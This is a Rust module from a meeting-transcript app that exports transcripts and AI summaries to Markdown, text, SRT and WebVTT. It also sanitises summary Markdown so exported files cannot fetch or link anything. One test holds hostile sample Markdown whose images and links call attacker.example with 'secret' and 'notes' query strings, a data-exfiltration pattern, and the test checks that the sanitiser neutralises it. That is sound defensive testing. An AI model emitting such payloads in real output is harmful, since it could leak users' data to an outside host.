//! Transcript rendering for export/copy: Markdown, plain text, SRT, WebVTT.

use crate::db::Db;
use anyhow::{bail, Context, Result};
use std::collections::HashMap;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExportFormat {
    Markdown,
    Text,
    Srt,
    Vtt,
}

impl ExportFormat {
    pub fn parse(s: &str) -> Result<ExportFormat> {
        Ok(match s {
            "md" | "markdown" => ExportFormat::Markdown,
            "txt" | "text" => ExportFormat::Text,
            "srt" => ExportFormat::Srt,
            "vtt" => ExportFormat::Vtt,
            other => bail!("unknown export format: {other}"),
        })
    }

    pub fn extension(self) -> &'static str {
        match self {
            ExportFormat::Markdown => "md",
            ExportFormat::Text => "txt",
            ExportFormat::Srt => "srt",
            ExportFormat::Vtt => "vtt",
        }
    }
}

fn clock(ms: i64) -> String {
    let s = ms / 1000;
    format!("{}:{:02}:{:02}", s / 3600, (s % 3600) / 60, s % 60)
}

/// SRT wants `HH:MM:SS,mmm`, VTT wants `HH:MM:SS.mmm`.
fn stamp(ms: i64, sep: char) -> String {
    let s = ms / 1000;
    format!(
        "{:02}:{:02}:{:02}{sep}{:03}",
        s / 3600,
        (s % 3600) / 60,
        s % 60,
        ms % 1000
    )
}

/// Markdown headings one level deeper (`## Key points` → `### Key points`),
/// so a summary's sections nest under the export's `## Summary`.
fn demote_headings(markdown: &str) -> String {
    markdown
        .lines()
        .map(|line| {
            let hashes = line.chars().take_while(|c| *c == '#').count();
            if (1..6).contains(&hashes) && line[hashes..].starts_with(' ') {
                format!("#{line}")
            } else {
                line.to_string()
            }
        })
        .collect::<Vec<_>>()
        .join("\n")
}

/// Model output reduced to the Markdown subset the in-app renderer shows
/// (headings, lists, emphasis, text), so an exported file opened in a
/// Markdown viewer cannot fetch or link anything on its own:
/// images become their alt text, links become `text (`target`)` with the
/// target as an inert code span, bare URLs become code spans, HTML tags
/// and reference-style link definitions are dropped.
pub fn safe_markdown(markdown: &str) -> String {
    markdown
        .lines()
        .filter(|line| !is_link_definition(line))
        .map(safe_line)
        .collect::<Vec<_>>()
        .join("\n")
}

/// `[label]: target` (a reference-style link definition).
fn is_link_definition(line: &str) -> bool {
    let line = line.trim_start();
    line.starts_with('[')
        && line
            .find("]:")
            .is_some_and(|end| !line[1..end].contains(']'))
}

fn safe_line(line: &str) -> String {
    let chars: Vec<char> = line.chars().collect();
    let mut out = String::new();
    let mut i = 0;
    // `[text](target)` starting at `open` (the `[`): (text, target, next).
    let bracketed = |open: usize| -> Option<(String, String, usize)> {
        let close = (open + 1..chars.len()).find(|&j| chars[j] == ']')?;
        if chars.get(close + 1) != Some(&'(') {
            return None;
        }
        let end = (close + 2..chars.len()).find(|&j| chars[j] == ')')?;
        Some((
            chars[open + 1..close].iter().collect(),
            chars[close + 2..end].iter().collect(),
            end + 1,
        ))
    };
    while i < chars.len() {
        let c = chars[i];
        if c == '!' && chars.get(i + 1) == Some(&'[') {
            if let Some((alt, _, next)) = bracketed(i + 1) {
                out.push_str(alt.trim());
                i = next;
                continue;
            }
        }
        if c == '[' {
            if let Some((text, target, next)) = bracketed(i) {
                out.push_str(text.trim());
                let target = target.trim().replace('`', "");
                if !target.is_empty() {
                    out.push_str(&format!(" (`{target}`)"));
                }
                i = next;
                continue;
            }
        }
        if c == '<' {
            // An HTML tag or an autolink: `<` + letter, `/`, `!` or `?`.
            let tagish = chars
                .get(i + 1)
                .is_some_and(|n| n.is_ascii_alphabetic() || matches!(n, '/' | '!' | '?'));
            if let Some(end) = (i + 1..chars.len())
                .find(|&j| chars[j] == '>')
                .filter(|_| tagish)
            {
                i = end + 1;
                continue;
            }
        }
        if (c == 'h' || c == 'H') && starts_with_url(&chars[i..]) {
            let end = (i..chars.len())
                .find(|&j| chars[j].is_whitespace())
                .unwrap_or(chars.len());
            let url: String = chars[i..end].iter().filter(|c| **c != '`').collect();
            out.push_str(&format!("`{url}`"));
            i = end;
            continue;
        }
        out.push(c);
        i += 1;
    }
    out
}

fn starts_with_url(chars: &[char]) -> bool {
    let head: String = chars
        .iter()
        .take(8)
        .collect::<String>()
        .to_ascii_lowercase();
    head.starts_with("http://") || head.starts_with("https://")
}

pub fn render(db: &Db, meeting_id: i64, format: ExportFormat) -> Result<String> {
    let meeting = db
        .get_meeting(meeting_id)?
        .with_context(|| format!("meeting {meeting_id} not found"))?;
    let speakers: HashMap<i64, String> = db
        .get_speakers(meeting_id)?
        .into_iter()
        .map(|s| (s.id, s.display_name))
        .collect();
    let segments = db.get_segments(meeting_id)?;
    if segments.is_empty() {
        bail!("meeting has no transcript yet");
    }
    let name_of = |seg: &crate::db::Segment| -> String {
        seg.speaker_id
            .and_then(|id| speakers.get(&id).cloned())
            .unwrap_or_else(|| {
                if seg.track == "mic" {
                    "Me".into()
                } else {
                    "Them".into()
                }
            })
    };

    let summary = meeting.ai_summary.trim();
    let summary_note = if meeting.ai_summary_stale {
        "AI-generated from an earlier transcript of this meeting."
    } else {
        "AI-generated from the transcript."
    };
    let mut out = String::new();
    match format {
        ExportFormat::Markdown => {
            out.push_str(&format!("# {}\n\n", meeting.title));
            out.push_str(&format!("*{}*", meeting.started_at));
            if let Some(d) = meeting.duration_ms {
                out.push_str(&format!(" · {}", clock(d)));
            }
            out.push_str("\n\n");
            if !summary.is_empty() {
                // The summary's own `##` sections nest under its heading.
                out.push_str(&format!("## Summary\n\n*{summary_note}*\n\n"));
                out.push_str(&demote_headings(&safe_markdown(summary)));
                out.push_str("\n\n## Transcript\n\n");
            }
            for seg in &segments {
                out.push_str(&format!(
                    "**[{}] {}:** {}\n\n",
                    clock(seg.start_ms),
                    name_of(seg),
                    seg.text
                ));
            }
        }
        ExportFormat::Text => {
            out.push_str(&format!("{}\n{}\n\n", meeting.title, meeting.started_at));
            if !summary.is_empty() {
                out.push_str(&format!(
                    "SUMMARY ({summary_note})\n\n{summary}\n\nTRANSCRIPT\n\n"
                ));
            }
            for seg in &segments {
                out.push_str(&format!(
                    "[{}] {}: {}\n",
                    clock(seg.start_ms),
                    name_of(seg),
                    seg.text
                ));
            }
        }
        ExportFormat::Srt => {
            for (i, seg) in segments.iter().enumerate() {
                out.push_str(&format!(
                    "{}\n{} --> {}\n{}: {}\n\n",
                    i + 1,
                    stamp(seg.start_ms, ','),
                    stamp(seg.end_ms.max(seg.start_ms + 1), ','),
                    name_of(seg),
                    seg.text
                ));
            }
        }
        ExportFormat::Vtt => {
            out.push_str("WEBVTT\n\n");
            for seg in &segments {
                out.push_str(&format!(
                    "{} --> {}\n<v {}>{}\n\n",
                    stamp(seg.start_ms, '.'),
                    stamp(seg.end_ms.max(seg.start_ms + 1), '.'),
                    name_of(seg),
                    seg.text
                ));
            }
        }
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::db::NewSegment;

    fn db_with_meeting(tag: &str) -> (Db, i64, std::path::PathBuf) {
        let dir = std::env::temp_dir().join(format!(
            "witness-export-{tag}-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_nanos_opt().unwrap_or_default()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let db = Db::open(&dir.join("t.db")).unwrap();
        let id = db
            .create_meeting("Q3 planning", "2026-08-01T12:00:00Z", "manual")
            .unwrap();
        db.replace_transcript(
            id,
            &[],
            &[NewSegment {
                speaker_label: None,
                track: "mic".into(),
                start_ms: 5_000,
                end_ms: 6_000,
                text: "Ship it Friday.".into(),
            }],
            "parakeet",
        )
        .unwrap();
        (db, id, dir)
    }

    #[test]
    fn exports_carry_the_summary_only_when_there_is_one() {
        let (db, id, dir) = db_with_meeting("summary");
        let plain = render(&db, id, ExportFormat::Markdown).unwrap();
        assert!(!plain.contains("## Summary") && !plain.contains("## Transcript"));
        assert!(plain.contains("**[0:00:05] Me:** Ship it Friday."));

        db.set_ai_summary(
            id,
            "2026-08-01T12:00:00Z",
            1,
            "## Summary\nShip Friday.\n\n## Action items\n- **Me** — ship",
            "t",
        )
        .unwrap();
        let md = render(&db, id, ExportFormat::Markdown).unwrap();
        let summary_at = md
            .find("## Summary\n\n*AI-generated from the transcript.*")
            .unwrap();
        assert!(md.contains("### Summary\nShip Friday."), "{md}");
        assert!(md.contains("### Action items\n- **Me** — ship"), "{md}");
        let transcript_at = md.find("## Transcript").unwrap();
        assert!(summary_at < transcript_at);
        assert!(md[transcript_at..].contains("Ship it Friday."));

        let txt = render(&db, id, ExportFormat::Text).unwrap();
        assert!(txt.contains("SUMMARY (AI-generated from the transcript.)\n\n## Summary"));
        assert!(txt.contains("TRANSCRIPT\n\n[0:00:05] Me: Ship it Friday."));
        // Subtitles stay subtitles.
        assert!(!render(&db, id, ExportFormat::Srt)
            .unwrap()
            .contains("Summary"));
        assert!(!render(&db, id, ExportFormat::Vtt)
            .unwrap()
            .contains("Summary"));

        // After a retranscription the export says so.
        db.replace_transcript(
            id,
            &[],
            &[NewSegment {
                speaker_label: None,
                track: "mic".into(),
                start_ms: 0,
                end_ms: 1_000,
                text: "Again.".into(),
            }],
            "whisper",
        )
        .unwrap();
        assert!(render(&db, id, ExportFormat::Markdown)
            .unwrap()
            .contains("*AI-generated from an earlier transcript of this meeting.*"));
        drop(db);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn exported_summaries_cannot_fetch_or_link_anything() {
        let hostile = "## Summary\nSee ![](https://attacker.example/p.png?q=secret) and ![chart](x.png).\n\
            Read [the doc](https://attacker.example/?q=notes) <img src=\"https://a.example/x\"> <b>bold</b>\n\
            Bare https://attacker.example/q?=1 link and <https://auto.example>.\n\
            [ref]: https://attacker.example/ref\n\
            - **Ann** — ship [later] (no link) `code`";
        let safe = safe_markdown(hostile);
        assert!(!safe.contains("!["), "{safe}");
        assert!(!safe.contains("](") && !safe.contains('<'), "{safe}");
        assert!(!safe.contains("[ref]:"), "{safe}");
        assert!(safe.contains("See  and chart."), "{safe}");
        assert!(
            safe.contains("Read the doc (`https://attacker.example/?q=notes`)  bold"),
            "{safe}"
        );
        assert!(
            safe.contains("Bare `https://attacker.example/q?=1` link and ."),
            "{safe}"
        );
        assert!(
            safe.contains("- **Ann** — ship [later] (no link) `code`"),
            "{safe}"
        );
        // Every remaining URL sits inside a code span.
        for (i, _) in safe.match_indices("https://") {
            assert_eq!(&safe[i - 1..i], "`", "{safe}");
        }
    }

    #[test]
    fn headings_demote_one_level() {
        assert_eq!(
            demote_headings("# A\n## B\n####### too deep\n#hashtag\ntext"),
            "## A\n### B\n####### too deep\n#hashtag\ntext"
        );
    }
}
